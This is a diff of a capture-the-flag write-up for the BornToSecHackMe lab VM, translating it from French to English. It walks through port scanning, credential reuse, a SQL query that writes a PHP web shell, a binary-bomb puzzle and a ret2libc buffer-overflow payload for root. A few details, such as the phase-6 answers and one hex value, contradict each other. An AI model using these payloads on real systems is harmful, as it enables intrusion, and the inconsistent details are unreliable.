@@ -1,27 +1,27 @@
-#### I - Find the machine's IP
+## I - Find the machine's IP
 ``nmap -sn 192.168.31.0/24``
 >Nmap scan report for BornToSecHackMe (**192.168.31.26**)
 
 ----
 
-#### II - We check the services open on all ports
+## II - We check the services open on all ports
 ``nmap -p- -sV 192.168.31.26``
->Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-23 20:55 CEST
->Nmap scan report for BornToSecHackMe (192.168.31.26)
->Host is up (0.000079s latency).
->Not shown: 65529 closed tcp ports (conn-refused)
->PORT		STATE	SERVICE    VERSION
->**21/tcp	open	ftp        vsftpd 2.0.8 or later
->22/tcp		open	ssh        OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
->80/tcp		open	http       Apache httpd 2.2.22 ((Ubuntu))
->143/tcp		open	imap       Dovecot imapd
->443/tcp		open	ssl/http   Apache httpd 2.2.22
->993/tcp		open	ssl/imaps?
->Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel**
+>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-23 20:55 CEST  
+>Nmap scan report for BornToSecHackMe (192.168.31.26)  
+>Host is up (0.000079s latency).  
+>Not shown: 65529 closed tcp ports (conn-refused)   
+>PORT		STATE	SERVICE    VERSION  
+>**21/tcp	open	ftp        vsftpd 2.0.8 or later  
+>22/tcp		open	ssh        OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)  
+>80/tcp		open	http       Apache httpd 2.2.22 ((Ubuntu))  
+>143/tcp		open	imap       Dovecot imapd  
+>443/tcp		open	ssl/http   Apache httpd 2.2.22  
+>993/tcp		open	ssl/imaps?  
+>Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel**  
 
 ----
 
-#### III - We study known flaws in services
+## III - We study known flaws in services
 **SSH :**
 CVE-2016-0777 : Allows a malicious server to exfiltrate private client data by sending an SSH2_MSG_UNIMPLEMENTED packet in response to an SSH_FXP_INIT request.
 
@@ -43,11 +43,11 @@ msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
 
 ----
 
-#### III - We study the tree structure of the site
+## III - We study the tree structure of the site
 
 With ``dirb``, on https, we find this interesting:
 
-##### /forum
+### 1. /forum
 - type : my little forum
 - We search the forum and find a post:
 >Probleme login ?
@@ -62,7 +62,7 @@ We have already identified their login information from several lines including 
 - We tried on the forum, lmezard / !q]Ej?5K5cyAJ -> It works.
 - We found their email address on their profile: **laurie@borntosec.net**
 
-##### /webmail
+### 2. /webmail
 - SquirrelMail v1.4.22
 - Using the information gathered from the forum, we logged in: laurie@borntosec.net / !q\]Ej?*5K5cy*AJ
 - We found an email :
@@ -74,7 +74,7 @@ We have already identified their login information from several lines including 
 ``bash /usr/share/exploitdb/exploits/linux/remote/41910.sh https://192.168.31.26/webmail``
 -> Does not seem to work
 
-##### /phpmyadmin
+### 3. /phpmyadmin
 - The combination **root / Fg-'kKXBj87E:aJ$** works
 - In forum_db, mlf2_settings we find the version of my little forum: 2.3.4
 - In forum_db / mlt2_userdata, we have access to everyone's encrypted passwords -> TO BE EXPLORED? TRY DECRYPTING BY FINDING INFORMATION ON THE ENCRYPTION METHOD USED BY THIS VERSION OF MY LITTLE FORUM
@@ -92,11 +92,11 @@ SELECT "<HTML><BODY><FORM METHOD='GET' NAME='myform' ACTION=''><INPUT TYPE='text
 
 ----
 
-#### IV - Exploitons le reverse shell
+## IV - Let's exploit the reverse shell
 
-##### Listons les utilisateurs
-``cat /etc/passwd`` (voir resulat complet dans le fichier /ressources/users)
-Voici les resultats qui semblent interessants :
+### List the users
+``cat /etc/passwd`` (see full result in the file /resources/users)
+Here are the results that seem interesting: :
 >root: x:0:0:root:/root:/bin/bash
 www-data: x:33:33:www-data:/var/www:/bin/sh
 ft_root: x:1000:1000:ft_root,,,:/home/ft_root:/bin/bash
@@ -106,7 +106,8 @@ laurie: x:1003:1003:,,,:/home/laurie:/bin/bash
 thor: x:1004:1004:,,,:/home/thor:/bin/bash
 zaz: x:1005:1005:,,,:/home/zaz:/bin/bash
 
-On s'interesse a ceux disposant d'un dossier ``home`` avec la commande ``ls -la /home``
+We are interested in those who have a home directory with the command ``ls -la /home``
+
 >drwxr-x--- 2 www-data             www-data              31 Oct  8  2015 LOOKATME
 drwxr-x--- 6 ft_root              ft_root              156 Jun 17  2017 ft_root
 drwxr-x--- 3 laurie               laurie               143 Oct 15  2015 laurie
@@ -115,54 +116,54 @@ dr-xr-x--- 2 lmezard              lmezard               61 Oct 15  2015 lmezard
 drwxr-x--- 3 thor                 thor                 129 Oct 15  2015 thor
 drwxr-x--- 4 zaz                  zaz                  147 Oct 15  2015 zaz
 
-Hummm... LOOKATME ? Il se situe chez www-data, ca tombe bien, c'est notre user actuel, donc jettons un oeil :
+Hmm... LOOKATME? It is located at www-data, luckily, it is our current user, so let's take a look:
 ``ls -la /home/LOOKATME``
 >-rwxr-x--- 1 www-data www-data  25 Oct  8  2015 password
 
 ``cat /home/LOOKATME/password``
 >lmezard:G!@M6f4Eatau{sF"
 
-On teste en SSH, ca ne fonctionne pas.
-Comme nous connaissons deja son mot de passe forum et webmail, il nous reste a essayer en ftp -> ca fonctionne !
+We test it in SSH, it doesn't work.
+Since we already know their forum and webmail password, all that's left is to try in ftp -> **it works!**
 
 ----
 
-#### V - Le FTP
-Telechargeons le fichier README et lisons le :
+## V - Le FTP
+Let's download the README file and read it:
 >Complete this little challenge and use the result as password for user 'laurie' to login in ssh
 
-Telechargeons le fichier fun
-On decompresse l'archive ``tar xvf fun``
-On se retrouve avec un dossier contenant 750 fichiers **pcap**
-Ce ne sont pas reellement des fichiers pcap :
+**Let's download the fun file**
+We decompress the archive tar xvf fun
+We find ourselves with a folder containing 750 pcap files
+These are not actually pcap files:
 ``cat 00M73.pcap ``
 >void useless() {
 >
 >//file12%
 
-Les fichiers semblent numerotes en commentaire.
-On va essayer de les fusionner dans l'ordre indique des commentaires, on va utiliser le script shell fusion-pcap.sh.
-On nettoie les donnees inutiles du fichier, on compile et on execute le code, ce qui donne :
+The files seem numbered in the comments.
+We will try to merge them in the order indicated by the comments, we will use the shell script fusion-pcap.sh.
+We clean the unnecessary data from the file, compile and execute the code, which gives:
 >MY PASSWORD IS: Iheartpwnage
 >Now SHA-256 it and submit
 
-Une fois crypte en sha256 on obtient :
+Once encrypted in sha256 we get:
 >330B845F32185747E4F8CA15D40CA59796035C89EA809FB5D30F4DA83ECF45A4
 
 ----
 
-#### VI - Laurie SSH
-On teste de se connecter en SSH, ca ne fonctionne pas, on teste en lowercase :
+## VI - Laurie SSH
+We test to connect in SSH, it does not work, we test in lowercase:
 >330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
 
-Ca fonctionne, nous voila log en tant que laurie, en ssh sur le serveur !
+It works, we are now logged in as Laurie, in ssh on the server!
 
-On jette un oeil au contenu du dossier
+We take a look at the contents of the folder
 ``ls -l``
 >-rwxr-x--- 1 laurie laurie 26943 Oct  8  2015 bomb
 >-rwxr-x--- 1 laurie laurie   158 Oct  8  2015 README
 
-On lit le README
+We read the README
 ``cat README ``
 >Diffuse this bomb!
 >When you have all the password use it as "thor" user with ssh.
@@ -177,55 +178,61 @@ On lit le README
 >
 >NO SPACE IN THE PASSWORD (password is case sensitive).
 
-Un nouveau challenge...
-On va analyser la bomb, on commence par la telecharger :
+A new challenge...
+We will analyze the bomb, we start by downloading it:
 ``scp laurie@192.168.21.205:/home/laurie/bomb ~/Desktop/``
 
-Ensuite on l'etudie en decompilant le tout avec ghidra :
-- Le premier niveau est simple, on voit que phase1 se contente de compare l'entree utilisateur avec la string ``Public speaking is very easy.``
+Then we study it by decompiling everything with Ghidra:
+- The first level is simple, we see that phase1 just compares the user input with the string Public speaking is very easy.
 >Phase 1 defused. How about the next one?
-- En etudiant la phase2, on comprend que le premier chiffre doit etre 1 et que pour la suite chaque nombre doit etre egal au precedent * la position (index + 1) du nombre actuel, on obtient :
+
+- By studying phase2, we understand that the first number must be 1 and that for the following each number must be equal to the previous one multiplied by the current number's position (index + 1), we obtain:
 ``1 2 6 24 120 720``
 >That's number 2.  Keep going!
-- Pour la phase3, il nous faut 3 arguments. Le premier est un nombre situe entre 0 et 7, peu importe. Le deuxieme argument est lie au choix du premier argument, et le dernier argument doit etre la correspondance decimale defini pour chaque lettre, voila donc les combinaisons possibles :
+
+- For phase3, we need 3 arguments. The first one is a number between 0 and 7, no matter what. The second argument is linked to the first one choice, and the last argument must be the decimal correspondence defined for each letter, so here are the possible combinations:
 ``0 q 777, 1 b 214, 2 b 755, 3 k 251, 4 o 160, 5 t 458, 6 v 780, 7 b 524``
-L'indice etant ``b`` on va donc choisir ``1 b 214``.
+The hint being ``b`` we will therefore choose ``1 b 214``.
 >Halfway there!
-- Pour la phase4 on comprend que :
-	- ce doit etre un nombre superieur a 0
-	- quand on le passe la fonction func4 il doit donner 55
-	- en analysant func4 on comprends qu'il s'agit d'une suite de fibonacci recursive qui commence par 2 fois le chiffre 1. Dans une suite normale (commencant par 0 puis 1) le nombre 55 est obtenu a la dixieme position. Comme nous partons directement a la deuxieme position (1 puis 1), le chiffre attendu est donc 9.
-``9``
+
+- For phase4 we understand that:
+	- it must be a number greater than 0
+	- when we pass it the func4 function it must give 55
+	- By analyzing func4 we understand that it is a recursive fibonacci sequence that starts with two number 1. In a normal sequence (starting with 0 then 1) the number 55 is obtained at the tenth position. Since we start directly at the second position (1 then 1), the expected number is therefore **9**.
+9
 >So you got that one.  Try this one.
-- Pour la phase 5, il faut que l'on commence par trouver la valeur de array.123, en cherchant avec ghidra on trouve ``isrveawhobpnutfg``.
-Ensuite, chaque caractère de la chaîne d'entrée est converti en un byte, puis il est appliqué un opérateur ET binaire avec 0xf (ou 15 en décimal), ce qui a pour effet de ne conserver que les 4 derniers bits du byte (c'est-à-dire, le reste de la division du byte par 16).
-L'opération précédente donne un index dans array.123. Le caractère à cet index de array.123 est ajouté à une nouvelle chaîne local_c.
-La chaine local_c est ensuite comparee a l'input et doit correspondre.
-"g" est à l'indice 15 dans array.123, le caractere dont les 4 derniers bits correspondent à 15 -> "o" (0x6F).
-"i" est à l'indice 0 dans array.123, le caractere dont les 4 derniers bits correspondent à 0 -> "p" (0x70).
-"a" est à l'indice 6 dans array.123, le caractere dont les 4 derniers bits correspondent à 6 -> "e" (0x75).
-"n" est à l'indice 11 dans array.123, le caractere dont les 4 derniers bits correspondent à 11 -> "k" (0x6B).
-"t" est à l'indice 13 dans array.123, le caractere dont les 4 derniers bits correspondent à 13 -> "m" (0x6D).
-"s" est à l'indice 1 dans array.123, le caractere dont les 4 derniers bits correspondent à 1 -> "q" (0x71).
+
+- For phase 5, we need to first find the value of array.123, by searching with Ghidra we find isrveawhobpnutfg.
+Then, each character of the input string is converted to a byte, and a bitwise AND operator with 0xf (or 15 in decimal) is applied, which has the effect of retaining only the last 4 bits of the byte (i.e., the remainder of the byte division by 16).
+The previous operation gives an index in array.123 (between 0 and 15).
+After doing this for all the letters, we have a series of indices. These must be used to retrieve the letters in array.123 and form a string that matches the one hardcoded in the bomb (giants).
+"g" is at index 15 in array.123, char with last 4 bits is 15 -> "o" (0x6F).
+"i" is at index 0 in array.123, char with last 4 bits is 0 -> "p" (0x70).
+"a" is at index 6 in array.123, char with last 4 bits is 6 -> "e" (0x75).
+"n" is at index 11 in array.123, char with last 4 bits is 11 -> "k" (0x6B).
+"t" is at index 13 in array.123, char with last 4 bits is 13 -> "m" (0x6D).
+"s" is at index 1 in array.123, char with last 4 bits is 1 -> "q" (0x71).
 ``opekmq``
 >Good work!  On to the next...
-- Pour la phase6, on comprend qu'il y a des noeuds, numerotes de 1 a 6, qu'il faut trier. On sait grace a l'indice que le premier noeud est le numero 4. Je n'arrive pas a trouver de methode pour lire la valeur des noeuds en memoire, alors je vais le tenter en bruteforce a l'aide d'un script python maison (scripts/phase6.c)
->Combinaison correcte trouvée: 4 2 6 3 1 5
 
-On essaie la connexion ssh avec thor / Publicspeakingisveryeasy.126241207201b2149opekmq426315
--> Ca ne fonctionne pas !
+- For phase6, we understand that the input must be 6 different numbers between 1 and 6. The different permutations must be tested to find the one that matches the expected values.
+It seems that the expected array is [3, 4, 5, 6, 1, 2] (or reverse since we will enter it in reverse order). By trying several permutations, we find that 2 1 6 5 4 3 works.
+>Correct combinaison found: 4 2 6 3 1 5
 
-En relisant le sujet (et aussi apres beaucoup de recherches notamment sur slack), on se rend compte de la consigne :
+Try connecting with SSH using thor / Publicspeakingisveryeasy.126241207201b2149opekmq426315
+-> It doesn't work!
+
+Going back through the subject project file (and also after a lot of research notably on Slack), we notice the instruction:
 >For the part related to a (bin) bomb: If the password found is
 >123456. The password to use is 123546.
 
-On inverse donc le 3 et le 1 ce qui donne :
+So we swap the 3 and the 1 which gives:
 ``Publicspeakingisveryeasy.126241207201b2149opekmq426135``
-Et ca fonctionne !
+**And it works!**
 
-##### VII - Thor SSH
+## VII - Thor SSH
 ``cat README``
-Finish this challenge and use the result as password for 'zaz' user.
+Finish this challenge and use the result as the password for the 'zaz' user.
 
 ``cat turtle ``
 >[...]
@@ -248,18 +255,18 @@ Finish this challenge and use the result as password for 'zaz' user.
 >
 >Can you digest the message? :)
 
-On va telecharger le fichier :
+We will download the file:
 ``scp thor@192.168.21.205:/home/thor/turtle ~/Desktop/``
 
-Turtle fait reference a un module graphique du langage de programmation Python. Il est inspiré de la programmation Logo et permet de déplacer une tortue sur l’écran. On va donc creer un script (scripts/turtle.py) et l'executer.
-On voit la tortue dessiner les lettres **SLASH**.
-Apres plusieurs tests (majuscule, minuscule, SHA1, SHA256) on finit par trouver la forme attendue, il s'agit d'un simple hash MD5 :
+"Turtle" refers to a graphics module in the Python programming language. It's inspired by Logo programming and allows moving a turtle on the screen. We will create a script (scripts/turtle.py) and execute it.
+We see the turtle draw the letters **SLASH**.
+After several tests (uppercase, lowercase, SHA1, SHA256), we finally find the expected format, it is a simple MD5 hash:
 ``646da671ca01bb5d84dbb5fb2238dc8e``
 
-##### VII - Zaz SSH
+## VII - Zaz SSH
 
-En analysant l'executable avec ghidra, on se rend compte que la fonction main utilise strcpy, sur une destination de 140, sans verifier la taille de la source.
-On va donc effectuer un debordement de tampon, et faire executer un shell root par le programme.
+By analyzing the executable with Ghidra, we realize that the main function uses strcpy, with a destination of 140, without checking the source size.
+So we will perform a buffer overflow and have the program execute a root shell.
 
 ``gdb exploit_me``
 >(gdb) disas main
@@ -287,30 +294,26 @@ Dump of assembler code for function main:
    0x08048437 <+67>:	ret
 End of assembler dump.
 
-- On set un breakpoint a la fin du main
+- We set a breakpoint at the end of the main
 ``(gdb) break *0x08048437``
 >Breakpoint 1 at 0x8048437
 
-- On envoi 140 caracteres a au programme pour remplir le tampon
+- We send 140 characters to the program to fill the buffer
 ``(gdb) run $(python -c 'print "a"*140')``
 >Starting program: /home/zaz/exploit_me $(python -c 'print "a"*140')
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 Breakpoint 1, 0x08048437 in main ()
 
-- On recupere l'adresse de la commande system
+- We get the address of the system command
 ``(gdb) p system``
 >$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
 
-- On recupere l'adresse de l'argument /bin/sh
+- We get the address of the /bin/sh argument
 ``(gdb) find __libc_start_main,+99999999,"/bin/sh"``
 >0xb7f8cc58
 1 pattern found.
 
-- On effectue le debordement de tampon, en entrant remplissant les 140 premiers caracteres avec du garbage, puis l'adresse de system, puis du garbage (pour remplir l'argument de system), puis on donne l'argument.
+- We perform the buffer overflow, filling the first 140 characters with garbage, then the address of the system, then garbage (to fill the system argument), then we provide the argument.
 ./exploit_me `python -c "print('a' * 140 + '\x60\xb0\xe6\xb7' + '0000' + '\x58\xcc\xf8\xb7')"`
 
-#-> **ROOOOOOT**## How to Fix
-- Encryption with private key rather than simple hashing
-- Backend validation of the cookie's validity and identity
-- Use of Secure and HttpOnly Flags, for cookie transmission via HTTPS only
-- Limiting cookies in time
+#-> **ROOOOOOT**
